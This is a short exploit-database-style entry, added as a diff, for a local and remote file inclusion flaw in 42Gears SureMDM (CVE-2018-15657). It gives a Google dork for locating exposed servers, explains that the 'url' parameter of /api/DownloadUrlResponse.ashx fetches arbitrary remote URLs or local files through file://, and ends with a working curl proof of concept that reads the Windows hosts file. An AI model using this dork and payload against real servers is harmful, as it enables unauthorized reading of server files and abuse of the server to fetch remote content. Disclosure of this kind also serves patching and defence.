@@ -1,0 +1,13 @@
+# Exploit Title: SureMDM LFI/RFI (Prior to 2018-11 Patch)
+# Google Dork: inurl:/api/DownloadUrlResponse.ashx
+# Date: 2019-02-01
+# Exploit Author: Digital Interruption
+# Vendor Homepage: https://www.42gears.com/
+# Software Link: https://www.42gears.com/products/suremdm-home/
+# Version: Versions prior to the November 2018 patch
+# Tested on: Windows
+# CVE : CVE-2018-15657
+
+An attacker can force the web server to request remote files and display the output by placing any arbitrary URL in the "url" parameter of /api/DownloadUrlResponse.ashx. This can also be utilised to request files from the local file system by using the file:// URI syntax, such as file://C:/WINDOWS/System32/drivers/etc/hosts
+
+Proof of concept: curl -H "ApiKey: apiKey" http://target/api/DownloadUrlResponse.ashx?url=file://C:/WINDOWS/System32/drivers/etc/hosts
